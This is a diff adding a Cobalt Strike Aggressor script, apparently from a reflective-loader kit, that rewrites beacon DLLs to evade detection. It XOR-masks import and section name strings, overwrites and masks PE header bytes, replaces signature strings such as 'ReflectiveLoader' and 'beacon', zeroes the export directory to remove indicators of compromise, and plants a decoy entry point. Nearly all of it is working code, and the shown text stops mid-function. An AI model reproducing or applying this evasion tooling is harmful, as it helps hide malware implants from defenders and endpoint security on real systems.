@@ -1,0 +1,1104 @@
+# User Defined Reflective Loader Kit Aggressor Script
+global('$temp_dll');
+
+# 'case insensitive sort' from sleep manual...
+sub caseInsensitiveCompare {
+	local('$a $b');
+    $a = lc($1);
+    $b = lc($2);
+    return $a cmp $b;
+}
+
+sub printBytesAt{
+	local('@Bytes');
+	local('$Offset $size $beacon_dll $index $Byte $x');
+	$beacon_dll = $1;
+	$Offset     = $2;
+	$size       = $3;
+	for ($x = 0; $x < $size; $x++) {
+		$index = $Offset;
+		$index += $x;
+		$Byte = byteAt($beacon_dll, $index);
+		@Bytes[$x] = uc(formatNumber($Byte, 16));
+	}
+	println("|_ bytes at offset $Offset: ".@Bytes);
+}
+
+
+sub my_dump_my_pe {
+    local('$my_pe $out $key $val %pemap @sorted_keys');
+	$my_pe = $1;
+    %pemap = pedump($my_pe);
+    @sorted_keys = sort(&caseInsensitiveCompare, keys(%pemap));
+    foreach $key (@sorted_keys) {
+        $out = "$[50]key";
+        foreach $val (values(%pemap, @($key))) {
+            $out .= " $val";
+            println($out);
+        }
+    }
+}
+
+# Open windows executable CS window with crtl+1 from GUI
+bind Ctrl+1 {
+	openWindowsExecutableStageDialog();
+	return;
+}
+
+sub array2Int {
+    local('@cArray $cVal $cIndex');
+    $cVal = 0;
+
+    if ((size(@_) == 1) && (size($1) == 4)) { 
+        @cArray = reverse($1);
+        
+        foreach $cIndex (@cArray) {
+            $cVal = ($cVal << 8) + ($cIndex & 0xFF);
+        }
+        return $cVal;
+    }
+}
+
+sub getStringFromOffset {
+	local('$beacon_dll $Offset $indexer $byte $y $tString @chars');
+
+	$beacon_dll = $1;
+	$Offset     = $2;
+
+	$y = 0;
+	@chars =  @(0);
+	clear(@chars);
+	$tString = "";
+	while (true){
+		$indexer = 0;
+		$byte = 0;
+		$indexer = $Offset;
+		$indexer += $y;
+		$byte = byteAt($beacon_dll, $indexer);
+		if ($byte == 0){
+			break;
+		}
+		@chars[$y] = chr($byte);
+		$y++;
+	} 
+	$tString = join("",@chars);
+	return $tString;
+}
+
+
+sub boku_pe_mask_ImportStrings {
+	local('%pemap');
+	local('$beacon_dll $xorKey');
+	local('$name_raw $dllstr_raw_vs_rva_diff $out @sorted_keys $key $val @import_dll_name_RVA $i');
+	local('@import_dll_string $import_dll_strlen @import_dll_OriginalFirstThunk_RVA');
+	local('$OriginalFirstThunk_RVA $j $oft_raw_vs_rva_diff $oft_raw $array_size_check');
+	$beacon_dll = $1;
+	$xorKey     = $2;
+	$isPivot    = $3;
+
+	%pemap = 0;
+	$name_rva = 0;
+	$dllstr_raw_vs_rva_diff = 0;
+	$out = 0;
+	$key = 0;
+	$val = 0;
+	$i = 0;
+	$import_dll_strlen = 0;
+	$OriginalFirstThunk_RVA = 0;
+	$j = 0;
+	$oft_raw_vs_rva_diff = 0;
+	$oft_raw = 0;
+	$array_size_check = 0;
+	@sorted_keys =  @(0);
+	clear(@sorted_keys);
+	@import_dll_OriginalFirstThunk_RVA =  @(0);
+	clear(@import_dll_OriginalFirstThunk_RVA);
+	@import_dll_name_RVA =  @(0);
+	clear(@import_dll_name_RVA);
+	@import_dll_string = @(0);
+	clear(@import_dll_string);
+
+	println("[+] Masking Import DLL names with single byte XOR key 0x".uc(formatNumber($xorKey, 16)));
+	println("|__ Finding Import RVAs from CS hashmap");
+
+	%pemap = pedump($beacon_dll);
+	# Get all import dll names from the CS pemap
+    @sorted_keys = sort(&caseInsensitiveCompare, keys(%pemap));
+    foreach $key (@sorted_keys)
+    {
+        $out = "$[50]key";
+        foreach $val (values(%pemap, @($key)))
+        {
+			if ("Import." isin $key)
+			{
+				if (".RVAModuleName.<value>" isin $key){
+					println("  |__ Found match:      ".$key." : 0x".uc(formatNumber($val, 16)));
+					# insert name_RVA into the beginning of the array
+					add(@import_dll_name_RVA,$val,0);
+				}
+				#if ($key hasmatch '(Import.*.RVAFunctionNameList.<value>)') {
+				if (".RVAFunctionNameList.<value>" isin $key){
+					println("  |__ Found match:      ".$key." : 0x".uc(formatNumber($val, 16)));
+					# insert OriginalFirstThunk into the beginning of the array
+					add(@import_dll_OriginalFirstThunk_RVA,$val,0);
+				}
+			}
+		}
+	}
+	# Sometimes CS will only find 1 DLL import module instead of all of them. Check that we have the correct #
+	# Pivot beacon should have 3 RVAs in the arrays. 1 for each import DLL
+	if ($isPivot == 1)
+	{
+		$array_size_check = 0;
+		$array_size_check = size(@import_dll_name_RVA);
+		println("[+] Found $array_size_check Import DLL name RVAs. Checking we have all 3 for Pivot beacon..")
+		if ($array_size_check < 3)
+		{
+			warn("Failed to to find the import DLL name strings! Only found $array_size_check of 3!");
+			return $null;
+		}
+		$array_size_check = 0;
+		$array_size_check = size(@import_dll_OriginalFirstThunk_RVA);
+		println("[+] Found $array_size_check Import DLL Original First Thunk RVAs. Checking we have all 3 for Pivot beacon..")
+		if ($array_size_check < 3)
+		{
+			warn("Failed to find the import entry first thunk! Only found $array_size_check of 3!");
+			return $null;
+		}
+	}
+	# HTTP/S beacon should have 4 RVAs in the arrays. 1 for each import DLL
+	if ($isPivot == 0)
+	{
+		$array_size_check = 0;
+		$array_size_check = size(@import_dll_name_RVA);
+		println("[+] Found $array_size_check Import DLL name RVAs. Checking we have all 4 for HTTP/S beacon..")
+		if ($array_size_check < 4)
+		{
+			warn("Failed to obfuscate the import DLL name import strings! Only found $array_size_check of 4!");
+			return $null;
+		}
+		$array_size_check = 0;
+		$array_size_check = size(@import_dll_OriginalFirstThunk_RVA);
+		println("[+] Found $array_size_check Import DLL Original First Thunk RVAs. Checking we have all 4 for HTTP/S beacon..")
+		if ($array_size_check < 4)
+		{
+			warn("Failed to find the import entry first thunk! Only found $array_size_check of 4!");
+			return $null;
+		}
+	}	
+
+	# Mask the Import DLL name strings for the DLL name (ex: "kernel32.dll")
+	$i = 0;
+	foreach $name_rva (@import_dll_name_RVA)
+	{
+		# Print Import DLL name string RVA
+		println("[".$i."] Import DLL name RVA         : 0x".uc(formatNumber($name_rva, 16)));
+		# Discover section for string location and get RVA vs raw difference
+		$dllstr_raw_vs_rva_diff = getSectionRawVsVirtualOffset($beacon_dll,$name_rva,0);
+		$name_raw = $name_rva - $dllstr_raw_vs_rva_diff;
+		# Print Import DLL name string raw addr
+		#println("|__ Import DLL name raw address : 0x".uc(formatNumber($name_raw, 16)));
+		# Get the length of the string so we know the len to XOR
+		@import_dll_string[$i] = getStringFromOffset($beacon_dll, $name_raw);
+		$import_dll_strlen = strlen(@import_dll_string[$i]);
+		# XOR the Import DLL name string
+		#println("|__ Masking DLL name: ".@import_dll_string[$i]);
+		$beacon_dll = pe_mask($beacon_dll, $name_raw, $import_dll_strlen, $xorKey);
+
+		$i++;
+	}
+
+	# Mask the Import DLL name strings for imported APIs (ex: GetProcAddress)
+	$j = 0;
+	foreach $OriginalFirstThunk_RVA (@import_dll_OriginalFirstThunk_RVA)
+	{
+		# Print Import DLL OriginalFirstThunk RVA
+		#println("[" . $j . "] Masking import entry name strings for " . @import_dll_string[$j] . " DLL with single byte XOR key: 0x".uc(formatNumber($xorKey, 16)));
+		#println("|__ Import DLL OriginalFirstThunk RVA  : 0x".uc(formatNumber($OriginalFirstThunk_RVA, 16)));
+		
+		$beacon_dll = xor_ImportEntryNames($beacon_dll, $OriginalFirstThunk_RVA, $xorKey);
+
+		$j++;
+	}
+
+    return $beacon_dll;	
+}
+
+
+sub boku_pe_mask_SectionNames {
+	local('%pemap');
+	local('@section0A @section1A @section2A @section3A @section4A');
+    local('$section0 $section1 $section2 $section3 $section4');
+    local('$section0strlen $section1strlen $section2strlen $section3strlen $section4strlen');
+    local('$section0str $section1str $section2str $section3str $section4str');
+	$beacon_dll = $1;
+	$xorKey     = $2;
+	%pemap = pedump($beacon_dll);
+
+	println("[+] Masking Section Names with single byte XOR key 0x".uc(formatNumber($xorKey, 16)));
+
+	@section0A    = values(%pemap, @("Sections.AddressOfName.0.<location>"));
+	$section0      = @section0A[0];
+	$section0str    = getStringFromOffset($beacon_dll, $section0);
+	$section0strlen = strlen($section0str);
+
+	@section1A    = values(%pemap, @("Sections.AddressOfName.1.<location>"));
+	$section1      = @section1A[0];
+	$section1str    = getStringFromOffset($beacon_dll, $section1);
+	$section1strlen = strlen($section1str);
+
+	@section2A      = values(%pemap, @("Sections.AddressOfName.2.<location>"));
+	$section2       = @section2A[0];
+	$section2str    = getStringFromOffset($beacon_dll, $section2);
+	$section2strlen = strlen($section2str);
+
+	@section3A    = values(%pemap, @("Sections.AddressOfName.3.<location>"));
+	$section3      = @section3A[0];
+	$section3str    = getStringFromOffset($beacon_dll, $section3);
+	$section3strlen = strlen($section3str);
+
+	@section4A      = values(%pemap, @("Sections.AddressOfName.4.<location>"));
+	$section4       = @section4A[0];
+	$section4str    = getStringFromOffset($beacon_dll, $section4);
+	$section4strlen = strlen($section4str);
+
+	println("|_ Plaintext Sections:  $section0str $section1str $section2str $section3str $section4str");
+
+	$beacon_dll = pe_mask($beacon_dll, $section0, $section0strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $section1, $section1strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $section2, $section2strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $section3, $section3strlen, $xorKey);
+	$beacon_dll = pe_mask($beacon_dll, $section4, $section4strlen, $xorKey);
+
+	$section0str    = getStringFromOffset($beacon_dll, $section0);
+	$section1str    = getStringFromOffset($beacon_dll, $section1);
+	$section2str    = getStringFromOffset($beacon_dll, $section2);
+	$section3str    = getStringFromOffset($beacon_dll, $section3);
+	$section4str    = getStringFromOffset($beacon_dll, $section4);
+
+	println("|_ XOR Masked Sections: $section0str $section1str $section2str $section3str $section4str");
+
+    return $beacon_dll;	
+}
+
+# Obfuscate all the Import Address Table Name Entry Strings with XOR 
+sub xor_ImportEntryNames {
+    local('@EntryThunk_8_bytes @EntryNameBytes');
+    local('%pemap');
+    local('$EntryThunk_raw $key $EntryName_rva $EntryName $maskkey $EntryThunk_offset $EntryThunk_byte_raw ');
+    local('$nullCheck $out $OrdinalCheck $EntryThunk_byte $FirstThunk_raw $EntryName_raw $EntryName_str');
+    local('$EntryName_strlen $rva_vs_raw_diff ');
+    local('@EntryName_rva_bytes $beacon_dll $xorKey $FirstThunk_rva');
+	 
+    $beacon_dll       = $1;
+    $FirstThunk_rva   = $2;
+    $xorKey           = $3;
+
+    $rva_vs_raw_diff  = 0;
+    $i                = 0;
+    $nullCheck        = 0;
+
+	# Discover section RVA vs raw difference
+	$rva_vs_raw_diff  = getSectionRawVsVirtualOffset($beacon_dll,$FirstThunk_rva,0);
+	$FirstThunk_raw   = $FirstThunk_rva - $rva_vs_raw_diff;
+	#println("|__ FirstThunk raw address:        0x".uc(formatNumber($FirstThunk_raw, 16)));
+	
+    while (1){
+        $OrdinalCheck         = 0;
+        $EntryThunk_offset    = 0;
+        $EntryThunk_raw       = 0;
+        $EntryThunk_byte_raw  = 0;
+        @EntryThunk_8_bytes   = @(0,0,0,0,0,0,0,0);
+		@EntryName_rva_bytes  = @(0,0,0,0);
+        $EntryThunk_byte      = 0;
+		$EntryName_raw        = 0;
+		$EntryName_str        = "";
+		$EntryName_rva        = 0;
+
+        $EntryThunk_offset   = $i * 8;
+        $EntryThunk_raw      = $FirstThunk_raw + $EntryThunk_offset;
+        #println("EntryThunk raw address : ".uc(formatNumber($EntryThunk_raw, 16)));
+
+        # Get the 8 bytes which hold the addr to the Import Name string
+		#printBytesAt($beacon_dll, $EntryThunk_raw, 8);
+        for ($x = 0; $x < 8; $x++) {
+            $EntryThunk_byte_raw    = $EntryThunk_raw + $x;
+            $EntryThunk_byte        = byteAt($beacon_dll, $EntryThunk_byte_raw);
+            @EntryThunk_8_bytes[$x] = $EntryThunk_byte;
+        }
+
+        # Check if the entry is an Ordinal 
+        $OrdinalCheck        = pop(@EntryThunk_8_bytes);
+        #println("OrdinalCheck : ".$OrdinalCheck);
+        # Shrink the array down to 4 entries
+        @EntryName_rva_bytes = sublist(@EntryThunk_8_bytes, 0, 4);
+        # Convert the array into an integer
+        $EntryName_rva       = array2Int(@EntryName_rva_bytes);
+
+		# Last import entry for DLL will be 8 zeros. If found, exit the loop
+		if ($EntryName_rva == 0)
+		{
+			break;
+		}
+
+		# Only do string XORing for Imports that have Name strings
+		if ($OrdinalCheck == 0){
+			$EntryName_raw    = $EntryName_rva - $rva_vs_raw_diff; 
+			$EntryName_raw   += 2;
+			#println("Entry name: 0x" . uc(formatNumber($EntryName_rva, 16))." (RVA)    |    0x".uc(formatNumber($EntryName_raw, 16))." (RAW)");
+
+			# pe_mask_string XORs the null string terminator byte which can causes an error in UDRL
+			$EntryName_str    = getStringFromOffset($beacon_dll, $EntryName_raw);
+			$EntryName_strlen = strlen($EntryName_str);
+			#println("  0x" . uc(formatNumber($EntryName_rva, 16))." (RVA)    |    0x".uc(formatNumber($EntryName_raw, 16))." (RAW)    | " . $EntryName_str);
+			$beacon_dll       = pe_mask($beacon_dll, $EntryName_raw, $EntryName_strlen, $xorKey);
+		}
+		$i++;
+	}
+	return $beacon_dll;
+}
+
+sub setEgg{
+	local('@Bytes');
+	local('$Offset $Egg $beacon_dll $index $Byte $x');
+	local('$Egg_p1 $Egg_p2 $index_egg');
+	$beacon_dll = $1;
+	$Egg_p1 = 0xACDC;
+	$Egg_p2 = 0xB0C0;
+	$Offset = 0x50;
+
+	#Write Egg
+	$index_egg  = $Offset;
+	$beacon_dll = pe_set_short($beacon_dll, $index_egg, $Egg_p1);
+	$index_egg += 2;
+	$beacon_dll = pe_set_short($beacon_dll, $index_egg, $Egg_p2);
+	$index_egg += 2;
+	$beacon_dll = pe_set_short($beacon_dll, $index_egg, $Egg_p1);
+	$index_egg += 2;
+	$beacon_dll = pe_set_short($beacon_dll, $index_egg, $Egg_p2);
+
+	for ($x = 0; $x < 8; $x++) {
+		$index = $Offset;
+		$index += $x;
+		$Byte = byteAt($beacon_dll, $index);
+		@Bytes[$x] = uc(formatNumber($Byte, 16));
+	}
+	println("|_ 8 bytes at Egg offset $Offset: ".@Bytes);
+	return $beacon_dll;
+}
+
+# Sets 2 Nops at a location in PE
+# Arg1 = BeaconBytes ; Arg2 = Offset
+sub setNops{
+	local('$Offset $Nops $beacon_dll');
+	$beacon_dll = $1;
+	$Nops = 0x9090;
+	$Offset = $2;
+
+	#Write Nops
+	$beacon_dll = pe_set_short($beacon_dll, $Offset, $Nops);
+
+	return $beacon_dll;
+}
+
+sub boku_pe_mask{
+	local('$maskkey $boku_pe_dll');
+    $boku_pe_dll = $1;
+    $maskkey = 123;
+	# CS RDI Code push r10; pop r10; MZAR - Make it NOPNOPNOPNOP
+    $boku_pe_dll = setNops($boku_pe_dll, 0x00);
+    $boku_pe_dll = setNops($boku_pe_dll, 0x02);
+	# Removing before 0x32 messes with the SRDI + Cant remove 0x3C-0x3D (offset to newExeHeader)
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x33, 0x8, $maskkey);
+    # Remove DOS header string
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x4D, 0x02, $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x58, 32,   $maskkey);
+	# PE Header
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x80, 0x4,  $maskkey);
+    # Other Header Masking
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x84, 0x2,  $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x88, 0xB,  $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0x96, 0x6,  $maskkey);
+    $boku_pe_dll = pe_mask($boku_pe_dll, 0xBC, 0x13, $maskkey);
+
+    return $boku_pe_dll;
+}
+
+sub prependBytes{
+	local('$beacon_dll $Nops');
+	$beacon_dll = $1;
+	# push rax; push rbx; pop rbx; pop rax;
+	$Nops = "PS[X";
+
+	println("[+] Prepending " . strlen($Nops) . " bytes to Beacon");
+	$beacon_dll = $Nops . $beacon_dll;
+
+	return $beacon_dll;
+}
+
+# ! WARNING - String has to be the same size or it throws off relocation table and beacon will crash while loading
+sub boku_strrep {
+	local('$beacon_dll');
+	$beacon_dll = $1;
+	$beacon_dll = strrep($beacon_dll, "ReflectiveLoader", "__BokuLoader____");
+	$beacon_dll = strrep($beacon_dll, "Microsoft Base Cryptographic Provider v1.0", "12367321236742382543232341241261363163151d");
+	$beacon_dll = strrep($beacon_dll, "(admin)", "(tomin)");
+	$beacon_dll = strrep($beacon_dll, "beacon", "bacons");
+	$beacon_dll = strrep($beacon_dll, "pivot", "bacon");
+	$beacon_dll = strrep($beacon_dll, "dnsb", "baco");
+	$beacon_dll = strrep($beacon_dll, ".rl100k.", ".bacons.");
+
+	return $beacon_dll;
+}
+
+# 	$temp_dll = setupAllocatorMethod($temp_dll,$allocator,$module_x64);
+sub setupAllocatorMethod {
+	local('$beacon_dll $allocator $module_x64 $allocator_code $allocator_code_offset');
+	local('@Bytes $Byte $index $x $modstrchk');
+	$beacon_dll = $1;
+	$allocator  = $2;
+	$module_x64 = $3;
+	$allocator_code = 0;
+	$allocator_code_offset = 64;
+	
+	# If the module_x64 string is set to a DLL, then use this allocator 
+	if ($module_x64 ne "") {
+		println("[+] Allocator method set to: Module DLL Stomp");
+		println("[+] Writing DLL UTF8 name string $module_x64 to beacon header at +0x44");
+		# 68 = 0x44 ; write string here same as Cobalt Strike does
+		$beacon_dll = pe_set_stringz($beacon_dll, 68, $module_x64);
+		# Check that the string was written
+		$modstrchk    = getStringFromOffset($beacon_dll, 68);
+		println("|_ Outputting string from beacon.dll+0x44: ".$modstrchk);
+		$allocator_code = 4;
+	# HeapAlloc, MapViewOfFile, and VirtualAlloc
+	}else if ($allocator eq "HeapAlloc") {
+		println("[+] Allocator  set to: ".$allocator);
+		$allocator_code = 3;
+	}else if ($allocator eq "MapViewOfFile") {
+		$allocator_code = 2;
+	}else {
+		$allocator_code = 1;
+	}
+	println("|_ Allocator code set to: ".$allocator_code);
+	println("|_ Writing allocator code at beacon.dll+0x40");
+	$beacon_dll = pe_set_short($beacon_dll, $allocator_code_offset, $allocator_code);
+	for ($x = 0; $x < 2; $x++) {
+		$index = $allocator_code_offset;
+		$index += $x;
+		$Byte = byteAt($beacon_dll, $index);
+		@Bytes[$x] = uc(formatNumber($Byte, 16));
+	}
+	println("|_ Allocator code at offset +0x40: ".@Bytes);
+	return $beacon_dll;
+}
+
+
+# 	$temp_dll = setupAllocatorMethod($temp_dll,$allocator,$module_x64);
+sub setup_obfuscate_xor_key {
+	local('$beacon_dll $allocator $module_x64 $allocator_code $allocator_code_offset');
+	local('@Bytes $Byte $index $x $modstrchk');
+	$beacon_dll = $1;
+	$obfuscate  = $2;
+	$xor_key    = $3;
+	# Write XOR Key to OEM Identifier at DOS Header+0x24 
+	$offset     = 36; 
+	$flag       = 0;
+
+	
+	if ($obfuscate eq "true") {
+		$flag = 1;
+		println("|_ Writing 0x".uc(formatNumber($xor_key, 16))." xor flag+key at beacon.dll+0x24 (OEM Identifier)");
+		println("|_ xor_key 0x".uc(formatNumber($xor_key, 16)));
+	}else {
+		$flag = 0;
+		$xor_key = 0;
+	}
+	$xor_key = ($xor_key << 8) + ($flag & 0xFF);
+
+	println("|_ Obfuscate + flag short 0x".uc(formatNumber($xor_key, 16)));
+	$beacon_dll = pe_set_short($beacon_dll, $offset, $xor_key);
+
+	return $beacon_dll;
+}
+
+
+# Sets NULLs (0x00) at a location in PE
+# Arg1 = BeaconBytes ; Arg2 = Offset ; Arg3 = Size to Zero-out
+sub setNulls{
+	local('$index $Byte $size $Offset $Nulls $beacon_dll');
+	$beacon_dll = $1;
+	$Offset     = $2;
+	$size       = $3;
+	$Nulls      = 0;
+
+	# shorts are 2 bytes, so we will null 2 bytes at a time. We use $size as counter so divide by 2
+	$size = $size / 2;
+
+	#Write Nulls
+	println("[+] Zeroing out memory at offset 0x".uc(formatNumber($Offset, 16)));
+	for ($x = 0; $x < $size; $x++) {
+		$index = $Offset;
+		$index += $x * 2;
+		#println("[+] Index 0x".uc(formatNumber($index, 16)));
+		$beacon_dll = pe_set_short($beacon_dll, $index, $Nulls);
+	}
+
+	return $beacon_dll;
+}
+
+sub nullExportDirectory{
+	local('$beacon_dll %pemap @ExportDirectory_size_array $ExportDirectory_VA');
+	local('$ExportDirectory_RawAddress $rawVsVirtualDiff @ExportDirectory_VA_array $ExportDirectory_size');	
+	$beacon_dll = $1;
+	%pemap = pedump($beacon_dll);
+	$ExportDirectory_RawAddress = 0;
+	# Export Directory is first entry in Data Directory
+	@ExportDirectory_size_array = values(%pemap, @("DataDirectory.0.Size.<value>"));
+	@ExportDirectory_VA_array   = values(%pemap, @("DataDirectory.0.VirtualAddress.<value>"));
+	$ExportDirectory_size       = @ExportDirectory_size_array[0];
+	$ExportDirectory_VA         = @ExportDirectory_VA_array[0];
+
+	println("[+] Zeroing out the Export Directory since we do not need it and it contains IOCs");
+	println("|__ Export Directory virtual address  : 0x".uc(formatNumber($ExportDirectory_VA, 16)));
+	println("|__ Export Directory size             : 0x".uc(formatNumber($ExportDirectory_size, 16)));
+	
+	$rawVsVirtualDiff = getSectionRawVsVirtualOffset($beacon_dll,$ExportDirectory_VA,1);
+	$ExportDirectory_RawAddress = $ExportDirectory_VA - $rawVsVirtualDiff;
+	println("|__ Export Directory raw     address  : 0x".uc(formatNumber($ExportDirectory_RawAddress, 16)));
+
+	println("|__ Export Directory Bytes before zeroing out  :");
+	printByteDump($beacon_dll,$ExportDirectory_size,$ExportDirectory_RawAddress);
+
+	$beacon_dll = setNulls($beacon_dll,$ExportDirectory_RawAddress,$ExportDirectory_size);
+	println("|__ Export Directory Bytes after zeroing out  :");
+	printByteDump($beacon_dll,$ExportDirectory_size,$ExportDirectory_RawAddress);
+	return $beacon_dll;
+}
+
+sub printByteDump{
+	local('$beacon_dll $size @Bytes_raw_row $offset $index $Byte @Bytes_raw @Bytes_hex @BytesRow $rowIndex $row');
+	$beacon_dll = $1;
+	$size       = $2;
+	$offset     = $3;
+
+	# print in rows of 16 bytes
+	$size = (16 - $size % 16) + $size;
+
+	#println("[+] Printing 0x".uc(formatNumber($size, 16))." bytes starting at offset 0x".uc(formatNumber($offset, 16)));
+
+	for ($x = 0; $x < $size; $x++) 
+	{
+		$index     = $offset;
+		$index    += $x;
+		$Byte      = byteAt($beacon_dll, $index);
+		@Bytes_raw[$x] = $Byte;
+		@Bytes_hex[$x] = uc(formatNumber($Byte, 16));
+		# Print the row 
+		if ((($x % 16) == 0) && ($x != 0))
+		{
+			@Bytes_raw_row =  @(0);
+			clear(@Bytes_raw_row);
+			$rowIndex = 0;
+			$row      = ($offset + $x) - 16;
+			# Print the position to the left 
+			if ($row == 0)
+			{
+				print("0x00    ");
+			}else
+			{
+				print("0x".uc(formatNumber($row, 16))."    ");
+			}
+			# Print out 16 hex bytes on a line
+			for ($y = 0; $y < 16; $y++)
+			{
+				#println("y equals $y");
+				$rowIndex = ($x - 16) + $y;
+				#println("rowIndex equals $rowIndex");
+				# Make sure if hex byte starts with a 0 that it is printed
+				$length = strlen(@Bytes_hex[$rowIndex]);
+				if ($length == 1)
+				{
+					print("0");
+				}
+				print(@Bytes_hex[$rowIndex]." ");
+				if ($y == 15)
+				{
+					print(@Bytes_raw_row);
+					println();
+				}
+			}
+		}
+	}
+	#println("|_ bytes: ".@Bytes);
+	return $beacon_dll;
+}
+
+sub getSectionRawVsVirtualOffset{
+	local('%pemap $rawVsVirtualDiff $temp_beacon_dll $relative_virtual_address');
+	local('@relocRawA $relocRaw @relocVAA $relocVA $relocDiff');
+	local('@textRawA $textRaw @textVAA $textVA $textDiff');
+	local('@dataRawA $dataRaw @dataVAA $dataVA $dataDiff');
+	local('@pdataRawA $pdataRaw @pdataVAA $pdataVA $pdataDiff');
+	local('@rdataRawA $rdataRaw @rdataVAA $rdataVA $rdataDiff');
+
+	$temp_beacon_dll          = $1;
+	$relative_virtual_address = $2;
+	$print_table              = $3;
+
+	%pemap = pedump($temp_beacon_dll);
+
+   	@relocRawA = values(%pemap, @(".reloc.PointerToRawData.<value>"));
+	$relocRaw  = @relocRawA[0];
+	@relocVAA  = values(%pemap, @(".reloc.VirtualAddress.<value>"));
+	$relocVA   = @relocVAA[0];
+	$relocDiff = $relocVA - $relocRaw;
+
+ 	@pdataRawA = values(%pemap, @(".pdata.PointerToRawData.<value>"));
+	$pdataRaw  = @pdataRawA[0];
+	@pdataVAA  = values(%pemap, @(".pdata.VirtualAddress.<value>"));
+	$pdataVA   = @pdataVAA[0];
+	$pdataDiff = $pdataVA - $pdataRaw;
+
+	@textRawA = values(%pemap, @(".text.PointerToRawData.<value>"));
+	$textRaw  = @textRawA[0];
+	@textVAA  = values(%pemap, @(".text.VirtualAddress.<value>"));
+	$textVA   = @textVAA[0];
+	$textDiff = $textVA - $textRaw;
+
+	@rdataRawA = values(%pemap, @(".rdata.PointerToRawData.<value>"));
+	$rdataRaw  = @rdataRawA[0];
+	@rdataVAA  = values(%pemap, @(".rdata.VirtualAddress.<value>"));
+	$rdataVA   = @rdataVAA[0];
+	$rdataDiff = $rdataVA - $rdataRaw;
+
+	@dataRawA = values(%pemap, @(".data.PointerToRawData.<value>"));
+	$dataRaw  = @dataRawA[0];
+	@dataVAA  = values(%pemap, @(".data.VirtualAddress.<value>"));
+	$dataVA   = @dataVAA[0];
+	$dataDiff = $dataVA - $dataRaw;
+
+	if ($print_table == 1){
+		println("Section   |     RAW Offset     | Virtual Address    | Raw Vs VA Difference");
+		println("--------------------------------------------------------------------------");
+		println("TEXT      |      0x00".uc(formatNumber($textRaw, 16))."              0x0".uc(formatNumber($textVA, 16))."               0x0".uc(formatNumber($textDiff, 16))); 
+		println("RDATA     |      0x".uc(formatNumber($rdataRaw, 16))."              0x".uc(formatNumber($rdataVA, 16))."               0x".uc(formatNumber($rdataDiff, 16))); 
+		println("DATA      |      0x".uc(formatNumber($dataRaw, 16))."              0x".uc(formatNumber($dataVA, 16))."               0x".uc(formatNumber($dataDiff, 16))); 
+		println("PDATA     |      0x".uc(formatNumber($pdataRaw, 16))."              0x".uc(formatNumber($pdataVA, 16))."               0x".uc(formatNumber($pdataDiff, 16))); 
+		println("RELOC     |      0x".uc(formatNumber($relocRaw, 16))."              0x".uc(formatNumber($relocVA, 16))."               0x".uc(formatNumber($relocDiff, 16))); 
+	}
+
+	if(($textVA <= $relative_virtual_address) && ($relative_virtual_address < $rdataVA)){
+		#println("|__ Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .text section");
+		$rawVsVirtualDiff = $textDiff;
+	
+	}else if(($rdataVA <= $relative_virtual_address) && ($relative_virtual_address < $dataVA)){
+		#println("|__ Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .rdata section");
+		$rawVsVirtualDiff = $rdataDiff;
+
+	}else if(($dataVA <= $relative_virtual_address) && ($relative_virtual_address < $pdataVA)){
+		#println("|__ Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .data section");
+		$rawVsVirtualDiff = $dataDiff;
+
+	}else if(($pdataVA <= $relative_virtual_address) && ($relative_virtual_address < $rdataVA)){
+		#println("|__ Discovered RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .pdata section");
+		$rawVsVirtualDiff = $pdataDiff;
+	}else{
+		#println("|__ Out of options, probably RVA 0x".uc(formatNumber($relative_virtual_address, 16))." in .reloc section");
+		$rawVsVirtualDiff = $relocDiff;
+	}
+	#println("|__ Raw vs VA section difference is 0x".uc(formatNumber($rawVsVirtualDiff, 16)));
+	return $rawVsVirtualDiff;
+}
+
+
+sub setDecoyEntryPoint{
+	local('%pemap $temp_beacon_dll $decoy_EntryPoint');
+	local('@AddressOfEntryPoint_location_A @AddressOfEntryPoint_value_A $AddressOfEntryPoint_location $AddressOfEntryPoint_value');
+	local('@LoaderFlags_location_A @LoaderFlags_value_A $LoaderFlags_location $LoaderFlags_value');
+
+	$temp_beacon_dll  = $1;
+	$decoy_EntryPoint = $2;
+
+	%pemap = pedump($temp_beacon_dll);	
+
+	@AddressOfEntryPoint_location_A  = values(%pemap, @("AddressOfEntryPoint.<location>"));
+	@AddressOfEntryPoint_value_A     = values(%pemap, @("AddressOfEntryPoint.<value>"));
+	$AddressOfEntryPoint_location    = @AddressOfEntryPoint_location_A[0];
+	$AddressOfEntryPoint_value       = @AddressOfEntryPoint_value_A[0];
+	println("[+] Original AddressOfEntryPoint 0x".uc(formatNumber($AddressOfEntryPoint_value, 16)));
+	println("[+] Changing to decoy AddressOfEntryPoint 0x".uc(formatNumber($decoy_EntryPoint, 16)));
+	$temp_beacon_dll = pe_set_long($temp_beacon_dll,$AddressOfEntryPoint_location,$decoy_EntryPoint);
+
+	@LoaderFlags_location_A  = values(%pemap, @("LoaderFlags.<location>"));
+	@LoaderFlags_value_A     = values(%pemap, @("LoaderFlags.<value>"));
+	$LoaderFlags_location    = @LoaderFlags_location_A[0];
+	$LoaderFlags_value       = @LoaderFlags_value_A[0];
+	println("[+] Original LoaderFlags 0x".uc(formatNumber($LoaderFlags_value, 16)));
+	println("[+] Placing real AddressOfEntryPoint at LoaderFlags location.");
+	$temp_beacon_dll = pe_set_long($temp_beacon_dll,$LoaderFlags_location,$AddressOfEntryPoint_value);
+
+
+	%pemap = pedump($temp_beacon_dll);	
+	@AddressOfEntryPoint_value_A     = values(%pemap, @("AddressOfEntryPoint.<value>"));
+	$AddressOfEntryPoint_value       = @AddressOfEntryPoint_value_A[0];
+	println("[+] New AddressOfEntryPoint value 0x".uc(formatNumber($AddressOfEntryPoint_value, 16)));
+	
+	@LoaderFlags_value_A     = values(%pemap, @("LoaderFlags.<value>"));
+	$LoaderFlags_value       = @LoaderFlags_value_A[0];
